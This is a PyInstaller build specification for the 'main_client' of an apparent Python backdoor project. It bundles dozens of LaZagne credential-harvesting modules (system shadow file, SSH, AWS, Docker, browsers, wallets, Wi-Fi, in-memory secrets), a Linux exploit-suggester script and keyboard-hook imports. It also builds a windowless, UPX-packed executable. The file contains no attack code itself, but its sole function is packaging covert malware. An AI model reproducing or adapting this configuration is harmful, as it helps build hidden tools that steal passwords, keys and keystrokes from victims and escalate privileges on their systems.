# -*- mode: python ; coding: utf-8 -*-


block_cipher = None


a = Analysis(
    ['main_client.py'],
    pathex=['/home/kaique/Desktop/Python-Backdoor/src/submodule/LaZagne/Linux'],
    binaries=[],
    datas=[('/home/kaique/Desktop/Python-Backdoor/src/submodule/linux-exploit-suggester/linux-exploit-suggester.sh', 'src/submodule/linux-exploit-suggester')],
    hiddenimports=['lazagne.softwares.mails.clawsmail', 'lazagne.softwares.mails.thunderbird', 'lazagne.softwares.databases.dbvis', 'lazagne.softwares.sysadmin.env_variable', 'lazagne.softwares.sysadmin.apachedirectorystudio', 'lazagne.softwares.sysadmin.filezilla', 'lazagne.softwares.sysadmin.fstab', 'lazagne.softwares.browsers.opera', 'lazagne.softwares.chats.pidgin', 'lazagne.softwares.chats.psi', 'lazagne.softwares.sysadmin.shadow', 'lazagne.softwares.sysadmin.aws', 'lazagne.softwares.sysadmin.docker', 'lazagne.softwares.sysadmin.ssh', 'lazagne.softwares.sysadmin.cli', 'lazagne.softwares.sysadmin.gftp', 'lazagne.softwares.sysadmin.keepassconfig', 'lazagne.softwares.sysadmin.grub', 'lazagne.softwares.databases.sqldeveloper', 'lazagne.softwares.databases.squirrel', 'lazagne.softwares.wifi.wifi', 'lazagne.softwares.wifi.wpa_supplicant', 'lazagne.softwares.wallet.kde', 'lazagne.softwares.wallet.libsecret', 'lazagne.softwares.memory.mimipy', 'lazagne.softwares.git.gitforlinux', 'lazagne.softwares.browsers.mozilla', 'lazagne.softwares.browsers.chromium_based', 'pynput.keyboard._win32', 'pynput.mouse._win32'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=['FixTk', 'tcl', 'tk', '_tkinter', 'tkinter', 'Tkinter'],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)
pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='main_client',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
